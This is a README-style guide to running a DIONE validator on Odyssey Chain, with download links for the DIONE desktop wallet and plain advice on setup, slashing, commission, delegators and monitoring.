![DIONE Wallet](assets/banner-article.png)

# Run an Orion DIONE Validator

<p align="center">Bond, stay online, stay listed</p>

<p align="center"><a href="https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-006971?style=for-the-badge&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white" alt="Windows"></a> <a href="https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-006971?style=for-the-badge&logo=apple&logoColor=white" alt="macOS"></a> <a href="https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-006971?style=for-the-badge&logo=linux&logoColor=white" alt="Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-66519E?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white&labelColor=1B1B1D" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`dione-wallet-v4.5.9.exe`](https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-66519E?style=flat-square&logo=apple&logoColor=white&labelColor=1B1B1D" alt="macOS"> | macOS 12 or later | [`dione-wallet-v4.5.9.dmg`](https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-66519E?style=flat-square&logo=linux&logoColor=white&labelColor=1B1B1D" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`dione-wallet-v4.5.9.zip`](https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.zip) |

</div>

All versions and checksums are on the [v4.5.9 release page](https://github.com/dione-protocol/dione-desktop-wallet/releases/tag/v4.5.9).

> [!WARNING]
> Only download from this GitHub release page. A mirror, a search advertisement or a file sent in a chat is not the project.

Running a validator means operating a node that produces blocks on Odyssey Chain, bonding the minimum self-stake, and keeping the machine online. Orion is the validator side of the network, and the requirements are the ordinary ones: a reliable host, a stable connection and the willingness to be responsible for other people's delegations.

## What a validator does

Validators propose and attest blocks. The chain pays them rewards, and delegators attach their DIONE to a validator's stake in exchange for a share of those rewards. That makes a validator an operator first and a business second: uptime is the product.

Two consequences follow. A validator that goes offline stops earning for itself and for everyone delegated to it. And a validator that misbehaves provably can be penalised, which is why the role is not a passive one.

## Before you start

- A machine that will stay up, with enough memory to run the node software comfortably.
- A stable connection and, ideally, a way to keep the node reachable.
- The minimum self-bond, which is a chain parameter rather than a fixed number you can assume - the staking interface shows the current figure when you create a validator.
- A plan for monitoring, because a node that fails silently is worse than one that fails loudly.

That third point is where most guides go wrong: they quote a number that was true at the time and is not a term of the chain. Read it from the interface you are using.

## The path, in order

1. Set up the node and let it sync fully before anything else. A validator that starts before its node is current will miss blocks.
2. Create the validator through the staking interface, setting the commission you intend to charge.
3. Bond the minimum self-stake from your own balance.
4. Confirm the validator appears in the active set once it has enough stake.
5. Watch uptime, blocks produced and delegation over the first days before promoting it.

Step five is not optional housekeeping. Delegators choose on the numbers the leaderboard shows, so a validator that starts badly is hard to recover.

## Can anyone run one?

Technically yes, and practically it depends on the four requirements above. There is no application process and no permission to request: you bond stake, the chain includes you when your stake is sufficient, and the network judges you by whether you produce blocks.

What is not open is the consequence of doing it badly. Slashing exists precisely because anyone can run a validator, and the stake at risk is what makes the role accountable.

## Hardware: can you run it on a Raspberry Pi?

A single-board computer is a reasonable way to learn, and a poor way to run something other people delegate to. The constraints are memory, storage reliability and thermal behaviour under sustained load rather than raw CPU speed.

If you want to experiment, a spare machine or a small server is a better first step than a Pi in a drawer, because the failure modes you are learning to handle - a full disk, a stalled process, a connection flap - are easier to see on hardware that is not also thermally throttling.

## Slashing, stated plainly

Slashing is a penalty applied to a validator's bonded stake, including the delegations attached to it, for provable misbehaviour. It is not a fee, not a routine charge, and not something that happens because a node was briefly slow.

The operational answer is unglamorous: run the software the network expects, keep the machine online, avoid double-signing by never running two copies of the same validator key, and treat key handling as seriously as a wallet's seed phrase. A validator key is a signing key with money behind it.

## Commission, and changing it later

Commission is what the validator keeps from delegators' rewards, typically in the 5-15% range. It can be adjusted later, and doing so is a normal part of running a validator - a change of cost, or of strategy.

Changing it upward is the mistake to think about in advance: delegators chose you on a rate, and a rate that moves without explanation is how a validator loses its stake. Communicate before changing, and expect the change to be visible on the leaderboard.

## Delegation, and what you owe delegators

Delegators are not customers in any contractual sense - the chain holds the terms - but they can leave, and the way they leave is expensive for them: a 10-day unbonding period and, before consolidation, a penalty.

That asymmetry is worth respecting, and the penalty schedule delegates face - [DIONE Staking Minimums and Early-Unstake Penalties](https://github.com/dione-protocol/staking-and-network/blob/main/dione-staking-minimum-and-penalties.md) - is the price of leaving you rather than of staying. A validator that communicates an outage honestly keeps its delegations; one that goes quiet during a problem loses them permanently.

[Choose a Validator in DIONE Wallet](https://github.com/dione-protocol/staking-and-network/blob/main/choose-a-validator-in-dione-wallet.md) is the same relationship from the delegator's side, and it is worth reading to understand what your reputation is being judged on.

## Monitoring what matters

Three signals cover most of it: whether the node is at the chain head, whether the validator is in the active set, and whether blocks are being produced at the expected rate. The leaderboard shows the third to the public, which is useful because it is also what delegators see.

A node that stops syncing is the most common validator failure: it falls behind the chain head, stops producing, and still looks healthy in a process list. Check the chain head first, then the disk, then the logs.

Set an alert for the first two. A validator that discovers an outage from a delegator's message has already lost the block rewards and some of its reputation.

## Keep the install current

DIONE Wallet is actively maintained, and the current release is published on the releases page.

The wallet is how most operators stake and check a validator, so a build that is behind can show stale uptime or a missing delegation. Install from [the v4.5.9 release](https://github.com/dione-protocol/dione-desktop-wallet/releases/tag/v4.5.9) before diagnosing the node, and keep the node software itself current on its own schedule.

## FAQ

### How do I run a validator on Odyssey Chain?

Sync a node fully, create the validator through the staking interface, bond the minimum self-stake, and keep the machine online. No application or permission is involved.

### How much DIONE do I need to self-bond a validator?

The minimum self-bond is a chain parameter, shown in the staking interface when you create the validator rather than a fixed figure. Check it there, because it is the number the chain enforces.

### Can I run an Odyssey validator on a Raspberry Pi?

For experimentation, yes; for stake other people depend on, use a machine with reliable storage and cooling. Memory and disk reliability are the limits, not CPU speed.

### What are the slashing risks?

A penalty applies to bonded stake for provable misbehaviour, including delegations. Keeping one validator key, never running two copies, and staying online is the practical defence.

### Can I change my validator commission later?

Yes, and it is normal. Raising it without warning is how delegations leave, so treat a change as something to announce first.

Operating a validator is a reliability commitment with money attached at both ends. The staking mechanics are in [How to Stake DIONE Coin](https://github.com/dione-protocol/staking-and-network/blob/main/how-to-stake-dione-coin.md), the ranking that judges you in [What the OBOL Leaderboard Means for DIONE Staking](https://github.com/dione-protocol/staking-and-network/blob/main/what-is-the-obol-leaderboard-for-dione.md), and the reward arithmetic in [DIONE Staking Rewards Explained](https://github.com/dione-protocol/staking-and-network/blob/main/dione-staking-rewards-explained.md).
